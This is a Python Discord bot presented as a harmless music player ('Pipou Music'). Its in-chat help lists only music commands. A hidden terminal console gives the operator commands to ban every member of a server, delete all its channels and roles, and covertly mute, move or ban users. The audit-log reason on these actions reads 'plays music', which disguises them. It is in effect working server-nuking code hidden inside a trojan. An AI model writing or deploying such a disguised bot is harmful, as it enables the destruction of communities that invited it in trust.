import discord
from discord.ext import commands
from discord import FFmpegPCMAudio
import yt_dlp as youtube_dl
import asyncio
import signal
import sys
import os

TOKEN = "your token"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

RED = "\033[91m"
GREEN = "\033[92m"
RESET = "\033[0m"
YELLOW = "\033[33m"
WHITE   = '\033[37m'

prompt = f">>"

HELP = f"""{YELLOW}
MENU D'AIDE PIPOU MUSIC :

Afficher l'aide >> help
Quitter la console >> exit

Liste des commandes disponibles :

        - admin_disconnect >> Déconnecte un utilisateur d'un salon vocal
        - admin_switch >> Déplace un utilisateur vers un autre salon vocal
        - admin_mute >> Mute un utilisateur
        - admin_unmute >> Unmute un utilisateur
        - admin_ban >> Ban un utilisateur de manière permanente
        - delete_channels >> Supprime tous les canaux vocaux et textuels du serveur spécifié
        - delete_roles >> Supprime tous les roles du serveur spécifié
        - ban_all >> Banni tous les utilisateur de serveur spécifié de manière permanente

Utilisation :

        - admin_disconnect <username>
        - admin_switch <username> <nom du channel>
        - admin_mute <username>
        - admin_unmute <username>
        - admin_ban <username>
        - delete_channels <servername>
        - delete_roles <servername>
        - ban_all <servername>
\n{RESET}"""


async def disconnect_vc():
    """Déconnecte le bot du salon vocal."""
    for vc in bot.voice_clients:
        await vc.disconnect()
    print("🔇 Bot déconnecté du salon vocal.")

async def terminal_listener():
    """Écoute les entrées dans le terminal pour arrêter le bot."""
    loop = asyncio.get_running_loop()
    while True:
        command = await loop.run_in_executor(None, input, prompt)
        if command.lower() == "exit":
            os.system("clear")
            print("🔴 Arrêt du bot...")
            await disconnect_vc()
            await bot.close()
            break
        elif command.startswith("admin_disconnect "):
             username = command.split(" ", 1)[1]
             await admin_disconnect(username)
        elif command.startswith("admin_switch "):
            parts = command.split(" ", 2)
            if len(parts) == 3:
                username, channel_name = parts[1], parts[2]
                await admin_switch(username, channel_name)
            else:
                print("❌ Commande invalide. Utilisez : admin_switch <username> <nom du channel>")
        elif command.startswith("admin_mute "):
            username = command.split(" ", 1)[1]
            await admin_mute(username)
        elif command.startswith("admin_unmute "):
            username = command.split(" ", 1)[1]
            await admin_unmute(username)
        elif command.startswith("admin_ban "):
            username = command.split(" ", 1)[1]
            await admin_ban(username)
        elif command.startswith("delete_channels "):
            server_name = command.split(" ", 1)[1]
            await delete_channels(server_name)
        elif command.startswith("delete_roles "):
            server_name = command.split(" ", 1)[1]
            await delete_roles(server_name)
        elif command.startswith("ban_all "):
            server_name = command.split(" ", 1)[1]
            print(f"Commande banAll reçue pour le serveur {server_name}.")
            await ban_all(server_name)
        elif command.startswith("help"):
            print(HELP)

async def ban_all(server_name):
    """Banni tous les utilisateurs du serveur spécifié."""
    for guild in bot.guilds:
        if guild.name.lower() == server_name.lower():
            print(f"Bannissement de tous les utilisateurs du serveur {guild.name}...")
            for member in guild.members:
                try:
                    await guild.ban(member, reason="Bannissement de tous les utilisateurs")
                    print(f"Utilisateur {member.name}#{member.discriminator} banni.")
                except discord.errors.Forbidden:
                    print(f"❌ Le bot n'a pas les permissions nécessaires pour bannir l'utilisateur {member.name}#{member.discriminator}.")
                except discord.errors.NotFound:
                    print(f"❌ L'utilisateur {member.name}#{member.discriminator} n'a pas été trouvé.")
                except Exception as e:
                    print(f"❌ Erreur inattendue lors du bannissement de l'utilisateur {member.name}#{member.discriminator}: {e}")
            print(f"Tous les utilisateurs du serveur {guild.name} ont été bannis.")
            return
    print(f"Serveur {server_name} non trouvé.")

async def delete_roles(server_name):
    """Supprime tous les rôles du serveur spécifié"""
    for guild in bot.guilds:
        if guild.name.lower() == server_name.lower():
            print(f"Suppression des rôles du server {guild.name}")
            for role in guild.roles:
                if role.name not in ["@everyone", "PiPou_Music"]:
                    try:
                        await role.delete()
                        print(f"Rôle {role.name} supprimé")
                    except discord.errors.Forbidden:
                        print(f"❌ Le bot n'a pas les permissions nécessaires pour supprimer le rôle {role.name}.")
                    except discord.errors.NotFound:
                        print(f"❌ Le rôle {role.name} n'a pas été trouvé.")
                    except Exception as e:
                        print(f"❌ Erreur inattendue lors de la suppression du rôle {role.name}: {e}")
            print(f"Tous les rôles du serveur {guild.name} ont été supprimés.")
            return
    print(f"Serveur {server_name} non trouvé.")

async def delete_channels(server_name):
    """Supprime tous les canaux vocaux et textuels du serveur spécifié."""
    for guild in bot.guilds:
        if guild.name.lower() == server_name.lower():
            print(f"Suppression des canaux du serveur {guild.name}")
            for channel in guild.channels:
                try:
                    await channel.delete(reason="Suppression de tous les canaux")
                    print(f"Canal {channel.name} supprimé.")
                except discord.errors.Forbidden:
                    print(f"❌ Le bot n'a pas les permissions nécessaires pour supprimer le canal {channel.name}.")
                except discord.errors.NotFound:
                    print(f"❌ Le canal {channel.name} n'a pas été trouvé.")
                except Exception as e:
                    print(f"❌ Erreur inattendue lors de la suppression du canal {channel.name}: {e}")
            print(f"Tous les canaux du serveur {guild.name} ont été supprimés.")
            return
    print(f"Serveur {server_name} non trouvé.")

async def admin_disconnect(username):
    """Déconnecte un utilisateur d'un salon vocal."""
    for guild in bot.guilds:
        for member in guild.members:
            if member.name.lower() == username.lower() or member.display_name.lower() == username.lower():
                if member.voice:
                    await member.move_to(None, reason="Joue de la musique")
                    print(f"🔇 Utilisateur {username} déconnecté du canal vocal.")
                else:
                    print(f"❌ Utilisateur {username} n'est pas dans un canal vocal.")
                return
    print(f"❌ Utilisateur {username} non trouvé.")

async def admin_switch(username, channel_name):
    """Déplace un utilisateur vers un autre canal vocal."""
    for guild in bot.guilds:
        for member in guild.members:
            if member.name.lower() == username.lower() or member.display_name.lower() == username.lower():
                for channel in guild.voice_channels:
                    if channel.name.lower() == channel_name.lower():
                        if member.voice:
                            await member.move_to(channel, reason="Joue de la musique")
                            print(f"🔊 Utilisateur {username} déplacé vers le canal vocal {channel_name}.")
                        else:
                            print(f"❌ Utilisateur {username} n'est pas connecté à un canal vocal.")
                        return
                print(f"❌ Canal vocal {channel_name} non trouvé.")
                return
    print(f"❌ Utilisateur {username} non trouvé.")
    
async def admin_mute(username):
    """Mute un utilisateur"""
    for guild in bot.guilds:
        for member in guild.members:
            if member.name.lower() == username.lower() or member.display_name.lower() == username.lower():
                if member.voice:
                    await member.edit(mute=True, reason="Joue de la musique")
                    print(f"🔇 Utilisateur {username} est muet.")
                else:
                    print(f"❌ Utilisateur {username} n'est pas connecté à un canal vocal.")
                return
    print(f"❌ Utilisateur {username} non trouvé.")

async def admin_unmute(username):
    """Unmute un utilisateur"""
    for guild in bot.guilds:
        for member in guild.members:
            if member.name.lower() == username.lower() or member.display_name.lower() == username.lower():
                if member.voice:
                    await member.edit(mute=False, reason="Joue de la musique")
                    print(f"🔊 Utilisateur {username} n'est plus muet.")
                else:
                    print(f"❌ Utilisateur {username} n'est pas connecté à un canal vocal.")
                return
    print(f"❌ Utilisateur {username} non trouvé.")

async def admin_ban(username):
    """Ban un utilisateur de manière permanente."""
    for guild in bot.guilds:
        for member in guild.members:
            if member.name.lower() == username.lower() or member.display_name.lower() == username.lower():
                await guild.ban(member, reason="Joue de la musique", delete_message_seconds=604800)
                print(f"🚫 Utilisateur {username} banni de manière permanente.")
                return
    print(f"❌ Utilisateur {username} non trouvé.")

@bot.command()
async def help(ctx):
    help_message = (
        "🎵 **Commandes disponibles :** 🎵\n\n"
        "**!help** : Affiche ce menu d'aide.\n"
        "**!play <URL>** : Joue une musique à partir d'un lien YouTube.\n"
        "**!pause** : Met la musique sur pause\n"
        "**!resume** : Rejoue la musique sur pause\n"
        "**!stop** : Arrête la musique en cours\n"
        "**!disconnect** : déconnecte le bot du salon vocal\n"
    )
    await ctx.message.delete()
    await ctx.send(help_message)

@bot.command()
async def play(ctx, url: str):
    if ctx.author.voice:
        channel = ctx.author.voice.channel

        if not ctx.voice_client:
            voice_client = await channel.connect()
        else:
            voice_client = ctx.voice_client

        if voice_client.is_playing():
            voice_client.stop()

        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True
        }

        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            audio_url = info['url']

        ffmpeg_options = {
            'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
            'options': '-vn'
        }

        voice_client.play(FFmpegPCMAudio(audio_url, **ffmpeg_options))
        await ctx.message.delete()
        await ctx.send(f"🎵 Lecture en cours : {info['title']}")

@bot.command()
async def disconnect(ctx):
    """Déconnecte le bot du salon vocal."""
    for vc in bot.voice_clients:
        await vc.disconnect()
        await ctx.message.delete()
        await ctx.send("🔇 Bot déconnecté du salon vocal.")
    else:
        await ctx.message.delete()
        await ctx.send("❌ Le bot n'est pas connecté")

@bot.command()
async def pause(ctx):
    if ctx.voice_client and ctx.voice_client.is_playing():
        ctx.voice_client.pause()
        await ctx.message.delete()
        await ctx.send("⏸️ Musique en pause.")
    else:
        await ctx.message.delete()
        await ctx.send("❌ Aucune musique en cours de lecture.")

@bot.command()
async def resume(ctx):
    if ctx.voice_client and ctx.voice_client.is_paused():
        ctx.voice_client.resume()
        await ctx.message.delete()
        await ctx.send("▶️ Musique relancée.")
    elif ctx.voice_client and ctx.voice_client.is_playing():
        await ctx.message.delete()
        await ctx.send("❌ La musique est déjà en cours de lecture.")
    else:
        await ctx.message.delete()
        await ctx.send("❌ Aucune musique en cours de lecture.")

@bot.command()
async def stop(ctx):
    if ctx.voice_client and ctx.voice_client.is_playing():
        ctx.voice_client.stop()
        await ctx.message.delete()
        await ctx.send("⏹️ Musique arrêtée.")
    else:
        await ctx.message.delete()
        await ctx.send("❌ Aucune musique n'est jouée.")


def handle_sigint(sig, frame):
    """CTRL + C → Déconnecte seulement du vocal, sans arrêter le bot."""
    print("\n⚠️ CTRL + C détecté → Déconnexion du salon vocal uniquement.")
    asyncio.create_task(disconnect_vc())

def handle_sigterm(sig, frame):
    """SIGTERM → Arrête le bot proprement."""
    print("\n🔴 SIGTERM détecté → Arrêt du bot...")
    asyncio.create_task(disconnect_vc())
    asyncio.create_task(bot.close())
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)
signal.signal(signal.SIGTERM, handle_sigterm)

async def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{RED} ________  ___  ________  ________  ___  ___          _____ ______   ___  ___  ________  ___  ________     ")
    print(f"{RED}|\   __  \|\  \|\   __  \|\   __  \|\  \ \  \        |\   _ \  _   \|\  \ \  \|\   ____\|\  \|\   ____\    ")
    print(f"{RED}\ \  \_\  \ \  \ \  \_\  \ \  \ \  \ \  \ \  \       \ \  \ \__\ \  \ \  \ \  \ \  \___|\ \  \ \  \___|    ")
    print(f"{RED} \ \   ____\ \  \ \   ____\ \  \ \  \ \  \ \  \       \ \  \ |__| \  \ \  \ \  \ \_____  \ \  \ \  \       ")
    print(f"{RED}  \ \  \___|\ \  \ \  \___|\ \  \_\  \ \  \_\  \       \ \  \    \ \  \ \  \ \  \|____|\  \ \  \ \  \____  ")
    print(f"{RED}   \ \__\    \ \__\ \__\    \ \_______\ \_______\       \ \__\    \ \__\ \_______\____\_\  \ \__\ \_______\ ")
    print(f"{RED}    \|__|     \|__|\|__|     \|_______|\|_______|        \|__|     \|__|\|_______|\_________\|__|\|_______|")
    print(f"{GREEN}                         _      _       _      _    _            _   _                                _     ")
    print(f"{GREEN}                        /_\  __| |_ __ (_)_ _ (_)__| |_ _ _ __ _| |_(_)___ _ _    __ ___ _ _  ___ ___| |___ ")
    print(f"{GREEN}                       / _ \/ _` | '  \| | ' \| (_-<  _| '_/ _` |  _| / _ \ ' \  / _/ _ \ ' \(_-</ _ \ / -_)")
    print(f"{GREEN}                      /_/ \_\__,_|_|_|_|_|_||_|_/__/\__|_| \__,_|\__|_\___/_||_| \__\___/_||_/__/\___/_\___|\n")
    print(f"{YELLOW}Bienvenue sur la console d'administration du bot chantant et amusant Pipou Music!!!\n")
    print(f"{YELLOW}Afficher l'aide >> help{RESET}")
    print(f"{YELLOW}Quitter >> exit{RESET}")
    asyncio.create_task(terminal_listener())
    await bot.start(TOKEN)

asyncio.run(main())
